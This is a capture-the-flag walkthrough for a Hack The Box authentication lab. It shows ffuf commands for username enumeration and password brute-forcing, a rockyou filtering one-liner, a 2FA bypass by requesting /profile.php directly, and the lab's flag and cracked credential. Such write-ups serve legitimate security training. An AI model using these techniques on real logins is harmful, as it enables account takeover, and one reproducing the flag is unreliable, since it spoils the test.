Scenario
You are tasked to perform a security assessment of a client's web application. For the assessment, the client has not provided you with credentials. Apply what you have learned in this module to obtain the flag.

CHALLENGE: 94.237.53.146:55903 


Question 1 - Obtain the flag. - HTB{d86115e037388d0fa29280b737fd9171} 
1) go to http://94.237.53.146:55903 -> login -> register account 
2) once we try to register an account we are faced with password requirements -> 
Password does not meet our password policy:

    Contains at least one digit
    Contains at least one lower-case character
    Contains at least one upper-case character
    Contains NO special characters
    Is exactly 12 characters long
3) to follow these lets make our own edited rockyou -> 

sudo grep '[[:upper:]]' /usr/share/wordlists/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{12}' > rockyouedit.txt


4) now we can register an account with any of these passwords -> i just typed -> head rockyouedit.txt and chose -> Liverpool123 
5) once logged in we are met iwth "You do not have admin privileges. The site is still under construction and only available to admins at this time." 
6) lets try logging in with correct user and random pass then random user and pass and see how the error messages are presented 
7) double random creds gives us "unknown user or password" but with our test user account and wrong password we are presented with "Invalid credentials."
8) ffuf to enumerate valid usernames -> ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://94.237.53.146:55903/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=123" -fr "Unknown username or password."
9) we are stopped with an output of -> gladys for a username 
10) now lets flip our ffuf and use our rockyouedit.txt to find ol gladys's password -> ffuf -w rockyouedit.txt -u http://94.237.53.146:55903/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=gladys&password=FUZZ" -fr "Invalid credentials." -t 60
11) we find our password of: dWinaldasD13 so gladys:dWinaldasD13
12) go back to login page and log in -> now we are faced with 2fa OTP 
13) intercept the /2fa.php request... we cant brute force it but what we can do is inside of repeater change the /2fa.php to /profile.php and hit send -> render inside of Response tab and we get the flag -> HTB{d86115e037388d0fa29280b737fd9171}
